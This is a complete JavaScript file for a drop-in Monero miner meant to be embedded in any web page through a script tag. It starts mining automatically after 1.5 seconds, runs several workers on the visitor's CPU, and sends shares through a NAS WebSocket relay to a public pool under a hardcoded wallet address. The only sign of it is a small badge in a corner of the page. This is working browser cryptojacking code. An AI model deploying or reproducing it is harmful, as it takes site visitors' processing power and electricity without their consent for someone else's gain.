// xmr-inject.js — Drop-in XMR miner for any HTML page (cross-origin capable)
// Works from HTTPS sites (e.g. ravenrockcorp.ca) to your NAS on the same LAN.
//
// Requirements:
//   - NAS must serve HTTPS on :8443 with self-signed cert (visitor accepts warning once)
//   - NAS must send CORS headers (handled by server.js v2.1+)
//
// Usage:
//   <script src="https://192.168.50.235:8443/inject/xmr-inject.js?wallet=YOUR_WALLET"></script>
//   <script src="https://192.168.50.235:8443/inject/xmr-inject.js?nas=wss://192.168.50.235:8443&workers=4"></script>

(function() {
  'use strict';

  // --- Config from script tag URL params or defaults ---
  const scriptTag = document.currentScript;
  const params = new URLSearchParams(scriptTag ? scriptTag.src.split('?')[1] || '' : '');
  // Derive NAS origin from the script's own URL (https://nas:8443/inject/xmr-inject.js → https://nas:8443)
  const NAS_ORIGIN = 'https://mycloudpr2100.tail5a8606.ts.net';
  const NAS_URL = params.get('nas') || (NAS_ORIGIN.replace(/^http/, 'ws'));
  const WALLET = params.get('wallet') || '8ApdEka2j6CUaaNKp12H1VBi1bziZB2T9Dhju1fPzgiTC8KBLWEEddVeZnpZjg7Ni4KCENsPLfSDfh2nbMhbFqngM5wKwHE';
  const WORKERS = parseInt(params.get('workers') || (Math.min((navigator.hardwareConcurrency || 4) - 1, 8)));
  const BASE_URL = location.origin + '/'; // worker.js + .wasm files hosted same-origin

  // --- State ---
  let ws = null, connected = false, mining = false;
  let workers = [], currentJob = null, minerId = null, nextShareId = 10;
  let accepted = 0, rejected = 0, totalHashrate = 0;

  // --- Badge UI ---
  const badge = document.createElement('div');
  badge.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#0a0a0a;color:#4caf50;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:6px 10px;border-radius:6px;border:1px solid #333;z-index:999999;cursor:pointer;min-width:120px;';
  badge.innerHTML = '<div style="color:#666;font-size:9px;text-transform:uppercase;">XMR Miner</div><div id="xmr-hr">0 H/s</div><div style="color:#888;font-size:9px"><span id="xmr-acc">0</span> acc / <span id="xmr-rej">0</span> rej</div>';
  document.addEventListener('DOMContentLoaded', () => document.body.appendChild(badge));
  if (document.body) document.body.appendChild(badge);

  badge.onclick = () => { if (mining) stopMining(); else startMining(); };

  function updateBadge() {
    const hr = document.getElementById('xmr-hr');
    const acc = document.getElementById('xmr-acc');
    const rej = document.getElementById('xmr-rej');
    if (hr) hr.textContent = totalHashrate + ' H/s';
    if (acc) acc.textContent = accepted;
    if (rej) rej.textContent = rejected;
    badge.style.borderColor = mining ? '#4caf50' : '#333';
    badge.style.color = mining ? '#4caf50' : '#666';
  }

  // --- WS connection ---
  function connectWS() {
    ws = new WebSocket(NAS_URL);
    ws.onopen = () => {
      connected = true;
      ws.send(JSON.stringify({
        method: 'configure', wallet: WALLET, poolHost: 'pool.supportxmr.com', poolPort: 3333,
        worker: 'inject-' + Math.random().toString(36).slice(2, 6),
        sysInfo: { cores: navigator.hardwareConcurrency, browser: 'inject', os: navigator.platform },
      }));
    };
    ws.onmessage = (ev) => { let msg; try { msg = JSON.parse(ev.data); } catch (e) { return; } handleMsg(msg); };
    ws.onclose = () => { connected = false; setTimeout(connectWS, 5000); };
    ws.onerror = () => {};
  }

  function handleMsg(msg) {
    if (msg.id === 1 || msg.id === '1') {
      if (msg.result && msg.result.job) {
        minerId = msg.result.id;
        onNewJob(msg.result.job);
      }
      return;
    }
    if (msg.id >= 10) {
      if (msg.result && msg.result.status === 'OK') { accepted++; updateBadge(); }
      else if (msg.error) { rejected++; updateBadge(); }
      return;
    }
    if (msg.method === 'job' && msg.params) onNewJob(msg.params);
  }

  function onNewJob(job) {
    const wasFirst = !currentJob;
    currentJob = job;
    if (workers.length === 0) return;

    // Server assigns a nonce range for this device — subdivide across local workers
    if (job.nonce_start !== undefined && job.nonce_end !== undefined) {
      const devStart = job.nonce_start >>> 0;
      const devEnd = job.nonce_end >>> 0;
      const devRange = devEnd - devStart;
      if (wasFirst) {
        for (const w of workers) w.postMessage({ type: 'init', seedHash: job.seed_hash });
      }
      for (let i = 0; i < workers.length; i++) {
        const wStart = (devStart + Math.floor(devRange * i / workers.length)) >>> 0;
        const wEnd = (i === workers.length - 1) ? devEnd : (devStart + Math.floor(devRange * (i + 1) / workers.length)) >>> 0;
        workers[i].postMessage({ type: 'nonceRange', start: wStart, end: wEnd });
        if (!wasFirst) workers[i].postMessage({ type: 'job', job });
      }
    } else {
      if (wasFirst) {
        for (const w of workers) w.postMessage({ type: 'init', seedHash: job.seed_hash });
      } else {
        for (const w of workers) w.postMessage({ type: 'job', job });
      }
    }
  }

  // --- Workers ---
  // Cross-origin workaround: fetch worker.js from NAS as text, wrap in a blob URL.
  // The worker then uses importScripts() + fetch() relative to NAS_BASE (passed via baseUrl msg).
  let workerBlobUrl = null;

  async function createCrossOriginWorker() {
    if (workerBlobUrl) return new Worker(workerBlobUrl);
    const resp = await fetch(BASE_URL + 'worker.js');
    const code = await resp.text();
    // Prepend a shim so importScripts resolves to the NAS origin
    const shim = `var NAS_BASE = ${JSON.stringify(BASE_URL)};\n`;
    const blob = new Blob([shim + code], { type: 'application/javascript' });
    workerBlobUrl = URL.createObjectURL(blob);
    return new Worker(workerBlobUrl);
  }

  async function startWorkers() {
    const n = WORKERS;
    try {
      for (let i = 0; i < n; i++) {
        const w = await createCrossOriginWorker();
        w.postMessage({ type: 'baseUrl', url: BASE_URL });

        w.onmessage = (e) => {
          const m = e.data;
          if (m.type === 'ready') {
            w.postMessage({ type: 'job', job: currentJob });
            w.postMessage({ type: 'start' });
          }
          else if (m.type === 'hashrate') {
            w._hashrate = m.hashrate;
            totalHashrate = workers.reduce((s, w2) => s + (w2._hashrate || 0), 0);
            updateBadge();
            if (ws && connected) ws.send(JSON.stringify({ method: 'stats', hashrate: totalHashrate, workers: n, accepted, rejected }));
          }
          else if (m.type === 'share') {
            if (ws && connected) ws.send(JSON.stringify({
              id: nextShareId++, jsonrpc: '2.0', method: 'submit',
              params: { id: minerId, job_id: m.jobId, nonce: m.nonce, result: m.result },
            }));
          }
          else if (m.type === 'status') { /* ignore status spam in inject mode */ }
          else if (m.type === 'error') { console.warn('[xmr-inject] worker error:', m.message); }
        };
        w.onerror = (e) => { console.warn('[xmr-inject] worker:', e.message); };
        workers.push(w);
      }
      mining = true;
      updateBadge();
    } catch (err) {
      console.error('[xmr-inject] failed to start workers:', err.message);
      badge.innerHTML += '<div style="color:#e74c3c;font-size:9px">NAS unreachable</div>';
    }
  }

  function stopMining() {
    for (const w of workers) { w.postMessage({ type: 'stop' }); w.terminate(); }
    workers = []; mining = false; totalHashrate = 0;
    if (ws) ws.close();
    updateBadge();
  }

  function startMining() {
    startWorkers();
    connectWS();
  }

  // Auto-start after 1.5s
  setTimeout(startMining, 1500);
})();
